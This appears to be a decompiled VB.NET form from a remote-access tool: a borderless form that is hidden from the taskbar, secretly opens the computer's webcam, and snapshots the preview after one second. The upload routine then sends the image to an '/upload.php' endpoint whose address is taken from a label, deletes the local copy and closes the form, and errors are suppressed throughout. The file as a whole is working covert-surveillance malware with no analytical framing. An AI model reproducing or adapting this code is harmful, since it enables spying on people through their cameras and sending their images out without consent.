Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Windows.Forms

<DesignerGenerated> _
Public Class Form6
    Inherits Form
    ' Methods
    Public Sub New()
        AddHandler MyBase.Load, New EventHandler(AddressOf Me.Form6_Load)
        Dim list As List(Of WeakReference) = Form6.__ENCList
        SyncLock list
            Form6.__ENCList.Add(New WeakReference(Me))
        End SyncLock
        Me.WebClient = New WebClient
        Me.InitializeComponent
    End Sub

    Private Sub cameraSource()
        Dim num2 As Integer
        Dim lpszName As String = Strings.Space(80)
        Dim lpszVer As String = Strings.Space(80)
        Dim num As Integer = 0
        Do
            If Form6.capGetDriverDescriptionA(CShort(num), lpszName, 80, lpszVer, 80) Then
                Me.ListBox1.Items.Add(lpszName.Trim)
            End If
            num += 1
            num2 = 9
        Loop While (num <= num2)
    End Sub

    <DllImport("avicap32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Public Shared Function capCreateCaptureWindowA(<MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszWindowName As String, ByVal dwStyle As Integer, ByVal x As Integer, ByVal y As Integer, ByVal nWidth As Integer, ByVal nHeight As Short, ByVal hWnd As Integer, ByVal nID As Integer) As Integer
    End Function

    <DllImport("avicap32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Public Shared Function capGetDriverDescriptionA(ByVal wDriverIndex As Short, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszName As String, ByVal cbName As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszVer As String, ByVal cbVer As Integer) As Boolean
    End Function

    <DllImport("user32", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Public Shared Function DestroyWindow(ByVal hndw As Integer) As Boolean
    End Function

    <DebuggerNonUserCode> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try 
            If (disposing AndAlso (Not Me.components Is Nothing)) Then
                Me.components.Dispose
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    Private Sub Form6_Load(ByVal sender As Object, ByVal e As EventArgs)
        Try 
            Me.cameraSource
            Me.ListBox1.SelectedIndex = 0
            Me.previewCamera(Me.PictureBox1)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError
        End Try
    End Sub

    Private Function getBitmap(ByVal pCtrl As Control) As Bitmap
        Try 
            Dim image As New Bitmap(pCtrl.Width, pCtrl.Height)
            Dim graphics As Graphics = Graphics.FromImage(image)
            Dim upperLeftSource As Point = pCtrl.Parent.PointToScreen(pCtrl.Location)
            graphics.CopyFromScreen(upperLeftSource, Point.Empty, image.Size)
            graphics.Dispose
            Return image
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            Dim bitmap As Bitmap = Nothing
            ProjectData.ClearProjectError
            Return bitmap
            ProjectData.ClearProjectError
        End Try
        Return Nothing
    End Function

    <DebuggerStepThrough> _
    Private Sub InitializeComponent()
        Me.components = New Container
        Me.ListBox1 = New ListBox
        Me.PictureBox1 = New PictureBox
        Me.Timer1 = New Timer(Me.components)
        Me.Label1 = New Label
        DirectCast(Me.PictureBox1, ISupportInitialize).BeginInit
        Me.SuspendLayout
        Me.ListBox1.FormattingEnabled = True
        Dim point As New Point(&H10, &H162)
        Me.ListBox1.Location = point
        Me.ListBox1.Name = "ListBox1"
        Dim size As New Size(&H22D, &H52)
        Me.ListBox1.Size = size
        Me.ListBox1.TabIndex = 9
        point = New Point(7, 5)
        Me.PictureBox1.Location = point
        Me.PictureBox1.Name = "PictureBox1"
        size = New Size(&H221, &H147)
        Me.PictureBox1.Size = size
        Me.PictureBox1.TabIndex = 8
        Me.PictureBox1.TabStop = False
        Me.Timer1.Interval = &H3E8
        Me.Label1.AutoSize = True
        point = New Point(13, &H1B7)
        Me.Label1.Location = point
        Me.Label1.Name = "Label1"
        size = New Size(&H27, 13)
        Me.Label1.Size = size
        Me.Label1.TabIndex = 10
        Me.Label1.Text = "Label1"
        Dim ef As New SizeF(6!, 13!)
        Me.AutoScaleDimensions = ef
        Me.AutoScaleMode = AutoScaleMode.Font
        size = New Size(&H22F, &H151)
        Me.ClientSize = size
        Me.Controls.Add(Me.Label1)
        Me.Controls.Add(Me.ListBox1)
        Me.Controls.Add(Me.PictureBox1)
        Me.FormBorderStyle = FormBorderStyle.None
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "Form6"
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.TopMost = True
        DirectCast(Me.PictureBox1, ISupportInitialize).EndInit
        Me.ResumeLayout(False)
        Me.PerformLayout
    End Sub

    Private Sub ListBox1_SelectedIndexChanged(ByVal sender As Object, ByVal e As EventArgs)
        Try 
            Me.CamSource = Me.ListBox1.SelectedIndex
            Me.Timer1.Start
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError
        End Try
    End Sub

    Private Sub previewCamera(ByVal pbCtrl As PictureBox)
        Me.hWnd = Form6.capCreateCaptureWindowA(Conversions.ToString(Me.CamSource), &H50000000, 0, 0, 0, 0, pbCtrl.Handle.ToInt32, 0)
        If (Form6.SendMessage(Me.hWnd, &H40A, Me.CamSource, 0) > 0) Then
            Form6.SendMessage(Me.hWnd, &H435, -1, 0)
            Form6.SendMessage(Me.hWnd, &H434, 30, 0)
            Form6.SendMessage(Me.hWnd, &H432, -1, 0)
            Form6.SetWindowPos(Me.hWnd, 1, 0, 0, pbCtrl.Width, pbCtrl.Height, 6)
        Else
            Form6.DestroyWindow(Me.hWnd)
        End If
    End Sub

    <DllImport("user32", EntryPoint:="SendMessageA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Public Shared Function SendMessage(ByVal hwnd As Integer, ByVal Msg As Integer, ByVal wParam As Integer, <MarshalAs(UnmanagedType.AsAny)> ByVal lParam As Object) As Integer
    End Function

    <DllImport("user32", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Public Shared Function SetWindowPos(ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal v As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    End Function

    Private Sub Timer1_Tick_1(ByVal sender As Object, ByVal e As EventArgs)
        Try 
            Me.getBitmap(Me.PictureBox1).Save("2.png", ImageFormat.Png)
            Me.uploadimg
            Me.Close
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError
        End Try
    End Sub

    Public Sub uploadimg()
        Try 
            Me.WebClient.UploadFile((Me.Label1.Text & "/upload.php"), "2.png")
            If File.Exists("2.png") Then
                File.Delete("2.png")
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError
        End Try
    End Sub


    ' Properties
    Friend Overridable Property Label1 As Label
        <DebuggerNonUserCode> _
        Get
            Return Me._Label1
        End Get
        <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
        Set(ByVal WithEventsValue As Label)
            Me._Label1 = WithEventsValue
        End Set
    End Property

    Friend Overridable Property ListBox1 As ListBox
        <DebuggerNonUserCode> _
        Get
            Return Me._ListBox1
        End Get
        <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
        Set(ByVal WithEventsValue As ListBox)
            Dim handler As EventHandler = New EventHandler(AddressOf Me.ListBox1_SelectedIndexChanged)
            If (Not Me._ListBox1 Is Nothing) Then
                RemoveHandler Me._ListBox1.SelectedIndexChanged, handler
            End If
            Me._ListBox1 = WithEventsValue
            If (Not Me._ListBox1 Is Nothing) Then
                AddHandler Me._ListBox1.SelectedIndexChanged, handler
            End If
        End Set
    End Property

    Friend Overridable Property PictureBox1 As PictureBox
        <DebuggerNonUserCode> _
        Get
            Return Me._PictureBox1
        End Get
        <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
        Set(ByVal WithEventsValue As PictureBox)
            Me._PictureBox1 = WithEventsValue
        End Set
    End Property

    Friend Overridable Property Timer1 As Timer
        <DebuggerNonUserCode> _
        Get
            Return Me._Timer1
        End Get
        <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
        Set(ByVal WithEventsValue As Timer)
            Dim handler As EventHandler = New EventHandler(AddressOf Me.Timer1_Tick_1)
            If (Not Me._Timer1 Is Nothing) Then
                RemoveHandler Me._Timer1.Tick, handler
            End If
            Me._Timer1 = WithEventsValue
            If (Not Me._Timer1 Is Nothing) Then
                AddHandler Me._Timer1.Tick, handler
            End If
        End Set
    End Property


    ' Fields
    Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
    <AccessedThroughProperty("Label1")> _
    Private _Label1 As Label
    <AccessedThroughProperty("ListBox1")> _
    Private _ListBox1 As ListBox
    <AccessedThroughProperty("PictureBox1")> _
    Private _PictureBox1 As PictureBox
    <AccessedThroughProperty("Timer1")> _
    Private _Timer1 As Timer
    Private CamSource As Integer
    Private components As IContainer
    Private hWnd As Integer
    Private Const HWND_BOTTOM As Integer = 1
    Private Const SWP_NOMOVE As Short = 2
    Private Const SWP_NOSIZE As Integer = 1
    Private Const SWP_NOZORDER As Short = 4
    Private WebClient As WebClient
    Private Const WM_CAP_DRIVER_CONNECT As Integer = &H40A
    Private Const WM_CAP_DRIVER_DISCONNECT As Integer = &H40B
    Private Const WM_CAP_EDIT_COPY As Integer = &H41E
    Private Const WM_CAP_FILE_SAVEAS As Integer = &H417
    Private Const WM_CAP_SEQUENCE As Integer = &H43E
    Private Const WM_CAP_SET_PREVIEW As Integer = &H432
    Private Const WM_CAP_SET_PREVIEWRATE As Integer = &H434
    Private Const WM_CAP_SET_SCALE As Integer = &H435
    Private Const WM_CAP_START As Short = &H400
    Private Const WS_CHILD As Integer = &H40000000
    Private Const WS_VISIBLE As Integer = &H10000000
End Class


